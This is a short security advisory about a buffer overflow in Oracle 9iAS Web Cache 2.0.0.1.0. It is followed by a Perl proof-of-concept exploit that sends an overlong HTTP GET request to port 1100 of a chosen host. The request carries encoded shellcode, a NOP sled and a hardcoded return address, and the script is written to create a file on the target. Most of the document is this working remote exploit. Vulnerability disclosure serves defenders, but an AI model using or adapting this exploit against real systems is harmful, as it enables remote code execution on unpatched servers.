source: http://www.securityfocus.com/bid/3443/info

A buffer overflow condition can be triggered in Oracle 9iAS Web Cache 2.0.0.1.0 by submitting a malicious URL. This overflow can lead to either the process exiting, the process hanging, or the injection of malicious code. This occurs on all four services provided by Web Cache.

While this vulnerability has been addressed in Oracle 91AS Web Cache 2.0.0.2.0, it has been reported that versions for Microsoft Windows NT are still vulnerable.

#!perl
#########################################################################
#
# Proof-of-concept exploit for Oracle9iAS Web Cache/2.0.0.1.0
# Creates the file c:\defcom.iyd
# By andreas@defcom.com (C)2001
#
#
# Since we do not control the space after what ESP points to, I was lazy
# and did a direct buffer jump. So, if it does not work, try changing
# the return address(start of buffer in mem) to one that fits your system.
# The buffer starts at 0x05c5f1e8 on my box(WIN2K prof SP2).
# /andreas
#
#########################################################################
$ARGC=@ARGV;
if ($ARGC !=1) {
        print "Usage: $0 <host>\n";
        print "Example: $0 127.0.0.1\n";
        exit;
}
use Socket;

my($remote,$port,$iaddr,$paddr,$proto);
$remote=$ARGV[0];
$port = "1100"; # default port for the web cache

$iaddr = inet_aton($remote) or die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) or die "Error: $!";
$proto = getprotobyname('tcp') or die "Error: $!";

socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die "Error: $!";
connect(SOCK, $paddr) or die "Error: $!";

$sploit = "\xeb\x03\x5a\xeb\x05\xe8\xf8\xff\xff\xff\x8b\xec\x8b\xc2\x83\xc0\x18\x33\xc9";
$sploit=$sploit . "\x66\xb9\xb3\x80\x66\x81\xf1\x80\x80\x80\x30\x99\x40\xe2\xfa\xaa\x59";
$sploit=$sploit . "\xf1\x19\x99\x99\x99\xf3\x9b\xc9\xc9\xf1\x99\x99\x99\x89\x1a\x5b\xa4";
$sploit=$sploit . "\xcb\x27\x51\x99\xd5\x99\x66\x8f\xaa\x59\xc9\x27\x09\x98\xd5\x99\x66";
$sploit=$sploit . "\x8f\xfa\xa3\xc5\xfd\xfc\xff\xfa\xf6\xf4\xb7\xf0\xe0\xfd\x99";
$msg = "GET " . $sploit . "\x90" x (3096 - length($sploit)) . "\xe8\xf1\xc5\x05" . " HTTP/1.0\n\n";
print $msg;
send(SOCK, $msg, 0) or die "Cannot send query: $!";
sleep(1);
close(SOCK);
exit;


